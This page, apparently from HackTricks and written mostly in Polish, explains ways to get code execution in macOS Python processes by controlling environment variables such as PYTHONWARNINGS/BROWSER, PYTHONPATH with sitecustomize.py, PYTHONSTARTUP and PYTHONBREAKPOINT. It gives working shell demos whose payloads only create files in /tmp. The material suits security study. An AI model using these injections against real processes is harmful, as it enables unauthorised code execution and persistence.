# Wstrzykiwanie do aplikacji Python w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Za pomocą zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`

Jeśli atakujący może kontrolować środowisko procesu Python, połączenie zmiennych `PYTHONWARNINGS` i `BROWSER` może doprowadzić do wykonania polecenia, gdy Python importuje moduł `antigravity` podczas przetwarzania spreparowanej opcji ostrzeżenia. Technika ta wykorzystuje fakt, że `antigravity` otwiera URL za pomocą modułu `webbrowser` w Pythonie, który uwzględnia zmienną środowiskową `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Через `PYTHONPATH` и `sitecustomize.py`

При обычном запуске модуль Python `site` добавляет пути, специфичные для сайта, а затем пытается импортировать модуль с именем `sitecustomize`. Разместив доступный для чтения атакующим каталог в начале `PYTHONPATH`, атакующий, контролирующий среду процесса, может заставить Python импортировать payload до целевого скрипта. Флаг `-S` отключает автоматическую инициализацию `site`, а изолированный режим (`-I`) игнорирует `PYTHONPATH` и подразумевает `-s` и `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

W przypadku persistence przez zapisywalny katalog user site zamiast dziedziczonego `PYTHONPATH` zobacz [pliki startowe Pythona `.pth`, `.start` i `usercustomize`](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Za pośrednictwem `PYTHONINSPECT` i `PYTHONSTARTUP` po skrypcie

W CPython 3.13+ skrypt uruchomiony z `PYTHONINSPECT=1` po zakończeniu przechodzi do sesji interaktywnej. Jeśli standardowe wejście jest terminalem i dostępny jest PyREPL, ta sesja wykonuje plik wskazany przez `PYTHONSTARTUP` **po** skrypcie docelowym, a przed wyświetleniem promptu. Atakujący, który kontroluje obie dziedziczone zmienne i ma dostęp do pliku startowego do odczytu, może więc uruchomić kod w procesie docelowym bez modyfikowania jego skryptu. Jest to wyzwalacz uruchamiany po skrypcie, a nie zwykły hook startowy.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Łańcuch nie wykonuje pliku startowego w starszych wersjach CPythona, gdy standardowe wejście nie jest terminalem ani gdy `PYTHONBREAKPOINT` wymusza podstawowy REPL. Opcje `-E` i `-I` ignorują zmienne `PYTHON*`. Zanim polegniesz na tej ścieżce, sprawdź używany interpreter i kontekst terminala.<sup>[[3]](#references)[[5]](#references)</sup>

## Za pomocą `PYTHONBREAKPOINT`

Od Pythona 3.7 (PEP 553) wbudowana funkcja `breakpoint()` importuje i wywołuje obiekt wskazywany przez `sys.breakpointhook`, a cel ten jest określany przez zmienną środowiskową **`PYTHONBREAKPOINT`** (`package.module.callable`). Import wskazanego modułu i wywołanie obiektu następują przed normalnym uruchomieniem debuggera, więc atakujący kontrolujący środowisko procesu, który wywołuje `breakpoint()` (co często zdarza się w skryptach konserwacyjnych/debugujących, a czasem pozostaje też w ścieżkach produkcyjnych), może uzyskać wykonanie kodu.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

W przeciwieństwie do `PYTHONWARNINGS`/`PYTHONPATH` wymaga to, aby cel faktycznie dotarł do wywołania `breakpoint()`, ale działa również wyłącznie przez **efekty uboczne importu** wskazanego modułu (można wskazać dowolny moduł, który da się zaimportować — na przykład umieszczony na początku `PYTHONPATH` — i którego kod na najwyższym poziomie wykonuje się podczas importu). Ustawienie `PYTHONBREAKPOINT=0` całkowicie wyłącza hook.



## References

- [1] [Hackowanie za pomocą zmiennych środowiskowych - elttam](https://www.elttam.com/blog/env/)
- [2] [site — hook konfiguracji specyficznej dla witryny](https://docs.python.org/3/library/site.html)
- [3] [Python: wiersz poleceń i środowisko](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — wbudowana funkcja breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Dyspozycja REPL interpretera CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Wykonywanie plików startowych PyREPL w CPythonie (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
